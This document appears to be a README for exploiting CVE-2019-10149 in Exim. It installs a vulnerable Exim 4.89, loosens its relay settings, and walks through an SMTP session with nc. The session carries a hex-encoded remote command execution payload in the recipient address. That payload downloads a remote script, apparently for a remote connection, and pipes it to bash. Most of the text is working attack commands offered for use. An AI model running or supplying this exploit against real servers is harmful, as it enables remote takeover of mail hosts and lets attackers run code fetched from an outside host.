# CVE-2019-10149 - Exim 4.87 < 4.91
Instructions for installing a vulnerable version of Exim and its expluatation
Tested on Linux Ubuntu 16.04, Exim 4.89

## Exim installation
Download and extract exim version 4.89
 * wget https://github.com/Exim/exim/releases/download/exim-4_89/exim-4.89.tar.xz && tar -xvf exim-4.89.tar.xz

Move into the extracted folder
 * cd exim-4.89/

Copy and modify required config files
 * sed -e 's,^EXIM_USER. * $,EXIM_USER=exim,' Local/Makefile src/EDITME > Local/Makefile

 * cp exim_monitor/EDITME Local/eximon.conf

Create exim user and group
 * sudo groupadd -g 31 exim 

 * sudo useradd -d /dev/null -c "Exim Daemon" -g exim -s /bin/false -u 31 exim

Install dependencies
 * sudo apt-get update
 * sudo apt-get install -y make build-essential libpcre3-dev libdb-dev libxt-dev libxaw7-dev

Install exim 4.89
 * sudo make install

Edit /usr/exim/configure to allow relaying so we can exploit without waiting 7 days
 * sudo sed -iz 's/domainlist relay_to_domains =/domainlist relay_to_domains =  * /' /usr/exim/configure
 * sudo sed -i '/hostlist   relay_from_hosts = localhost/c\hostlist   relay_from_hosts = 0.0.0.0' /usr/exim/configure
 * sudo sed -i '/require verify = recipient/c\#require verify = recipient' /usr/exim/configure

Run exim as user exim
 * sudo -H -u exim /usr/exim/bin/exim -bd -d-receive    
	
## Crafting the exploit
Convert your shell command to hex. Example:
 * /bin/sh -c “wget https://raw.githubusercontent.com/darsigovrustam/CVE-2019-10149/master/RemoteConnection.sh" -O - | bash
 * \x2Fbin\x2Fsh\t-c\t\x22wget\t\https\x3A\x2F\x2Fraw\x2Egithubusercontent\x2Ecom\x2Fdarsigovrustam\x2FCVE\x2D2019\x2D10149\x2Fmaster\x2FRemoteConnection\x2Esh\t-O\t-\t\x7C\tbash\x22\
	
	
Table for example:
 * \t-c\ = -c
 * \t\= space
 * x20 = space
 * x7C = |
 * x2F = /
 * x3A = :
 * x2D = -
 * x3E = >
 * x26 = &
 * x22 = "
 * x2E = .
	
## Exploit usage
First we use nc to start a connection to the server.
 * nc 192.168.0.168 25
 
Once we are connected we say HELO.
 * helo localhost
 * (Answer: 250 exim Hello localhost [192.168.0.168])

Next, we set the sender address to blank.
 * mail from:<>
 * (Answer: 250 OK)

Then we set out recipient address with the payload we made earlier by inserting our desired command where the ellipses is rcpt to:<${run{...}}@localhost>.
 * rcpt to:<${run{\x2Fbin\x2Fsh\t-c\t\x22wget\t\https\x3A\x2F\x2Fraw\x2Egithubusercontent\x2Ecom\x2Fdarsigovrustam\x2FCVE\x2D2019\x2D10149\x2Fmaster\x2FRemoteConnection\x2Esh\t-O\t-\t\x7C\tbash\x22\}}@localhost>
 * (Answer: 250 Accepted)

And finally We first type DATA, followed by 31 lines, a blank line, and a period.
 * DATA
 * Received: 1
 * Received: 2
 * Received: 3
 * Received: 4
 * Received: 5
 * Received: 6
 * Received: 7
 * Received: 8
 * Received: 9
 * Received: 10
 * Received: 11
 * Received: 12
 * Received: 13
 * Received: 14
 * Received: 15
 * Received: 16
 * Received: 17
 * Received: 18
 * Received: 19
 * Received: 20
 * Received: 21
 * Received: 22
 * Received: 23
 * Received: 24
 * Received: 25
 * Received: 26
 * Received: 27
 * Received: 28
 * Received: 29
 * Received: 30
 * Received: 31
 * 
 * .
